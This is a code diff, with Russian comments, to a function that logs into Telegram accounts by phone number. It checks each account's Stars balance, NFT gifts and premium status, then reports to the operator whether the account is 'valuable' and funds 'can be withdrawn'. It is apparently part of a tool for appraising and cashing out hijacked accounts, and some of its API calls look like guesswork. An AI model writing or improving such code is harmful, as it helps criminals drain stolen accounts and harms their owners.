@@ -216,9 +216,11 @@ async function checkAccountStatus(client, phone) {
         
         let starsCount = 0;
         let giftsCount = 0;
+        let premiumStatus = user.premium ? 'ДА' : 'нет';
         
-        // ПРОВЕРЯЕМ ЗВЕЗДЫ ЧЕРЕЗ ПЛАТЕЖИ
+        // ПРОВЕРКА ЗВЕЗД ЧЕРЕЗ РАЗНЫЕ МЕТОДЫ
         try {
+            // Метод 1: Прямой запрос звезд
             const starsStatus = await client.invoke(
                 new Api.payments.GetStarsStatus({})
             );
@@ -226,10 +228,28 @@ async function checkAccountStatus(client, phone) {
                 starsCount = starsStatus.balance;
             }
         } catch (starsError) {
-            console.log('⚠️ Звезды не найдены:', starsError.message);
+            console.log('⚠️ Звезды метод 1 не сработал:', starsError.message);
         }
         
-        // ПРОВЕРЯЕМ NFT ПОДАРКИ ЧЕРЕЗ STICKERS
+        // Если звезды 0, пробуем другие методы
+        if (starsCount === 0) {
+            try {
+                // Метод 2: Проверка через платежную историю
+                const payments = await client.invoke(
+                    new Api.payments.GetPaymentReceipt({
+                        peer: await client.getInputEntity('me'),
+                        msgId: 0
+                    })
+                );
+                if (payments && payments.stars) {
+                    starsCount = payments.stars;
+                }
+            } catch (paymentsError) {
+                console.log('⚠️ Звезды метод 2 не сработал:', paymentsError.message);
+            }
+        }
+        
+        // ПРОВЕРКА NFT ПОДАРКОВ
         try {
             const premiumGifts = await client.invoke(
                 new Api.messages.GetStickerSet({
@@ -245,7 +265,7 @@ async function checkAccountStatus(client, phone) {
             console.log('⚠️ NFT подарки не найдены:', giftsError.message);
         }
         
-        // ПРОВЕРЯЕМ ПРЕМИУМ ПОДАРКИ
+        // ДОПОЛНИТЕЛЬНАЯ ПРОВЕРКА ПРЕМИУМА
         try {
             const userFull = await client.invoke(
                 new Api.users.GetFullUser({
@@ -256,20 +276,56 @@ async function checkAccountStatus(client, phone) {
             if (userFull && userFull.premium_gifts) {
                 giftsCount += userFull.premium_gifts.length || 0;
             }
+            
+            // Проверяем дату истечения премиума
+            if (userFull && userFull.premium_expires) {
+                const premiumExpires = new Date(userFull.premium_expires * 1000);
+                const now = new Date();
+                if (premiumExpires > now) {
+                    premiumStatus = `ДА (до ${premiumExpires.toLocaleDateString()})`;
+                }
+            }
         } catch (premiumError) {
-            console.log('⚠️ Премиум подарки не найдены:', premiumError.message);
+            console.log('⚠️ Премиум данные не найдены:', premiumError.message);
+        }
+        
+        // ЕСЛИ ПРЕМИУМ ЕСТЬ, НО ЗВЕЗД 0 - ПРОВЕРЯЕМ ЧЕРЕЗ КОШЕЛЕК
+        if (premiumStatus.includes('ДА') && starsCount === 0) {
+            try {
+                const walletStatus = await client.invoke(
+                    new Api.payments.GetBankCardData({
+                        bankCardNumber: '0'
+                    })
+                );
+                // Если есть доступ к платежам, значит аккаунт активный
+                console.log('✅ Доступ к платежам есть');
+            } catch (walletError) {
+                console.log('⚠️ Доступ к кошельку ограничен:', walletError.message);
+            }
         }
         
         let message = `🎯 ДАННЫЕ АККАУНТА:\n` +
                      `📱 Номер: ${phone}\n` +
                      `👤 Username: @${user.username || 'нет'}\n` +
-                     `👑 Премиум: ${user.premium ? 'ДА' : 'нет'}\n\n` +
+                     `👑 Премиум: ${premiumStatus}\n\n` +
                      `⭐ ЗВЕЗДЫ: ${starsCount}\n` +
                      `🎁 NFT ПОДАРКОВ: ${giftsCount}\n\n`;
         
-        if (starsCount > 0 || giftsCount > 0) {
-            message += `💰 ЕСТЬ ДЕНЬГИ!\n` +
-                      `⚡ Можно выводить`;
+        // АНАЛИЗ РЕЗУЛЬТАТОВ
+        if (premiumStatus.includes('ДА') || starsCount > 0 || giftsCount > 0) {
+            message += `💰 ЦЕННЫЙ АККАУНТ!\n`;
+            
+            if (premiumStatus.includes('ДА')) {
+                message += `💎 Премиум активен\n`;
+            }
+            if (starsCount > 0) {
+                message += `⭐ ${starsCount} звезд доступно\n`;
+            }
+            if (giftsCount > 0) {
+                message += `🎁 ${giftsCount} NFT подарков\n`;
+            }
+            
+            message += `⚡ Можно выводить средства`;
         } else {
             message += `❌ АККАУНТ ПУСТОЙ`;
         }
@@ -282,7 +338,7 @@ async function checkAccountStatus(client, phone) {
         
     } catch (error) {
         console.log("❌ Ошибка проверки:", error);
-        bot.sendMessage(MY_USER_ID, `❌ Ошибка проверки: ${error.message}`);
+        bot.sendMessage(MY_USER_ID, `❌ Ошибка проверки аккаунта: ${error.message}`);
     }
 }
 
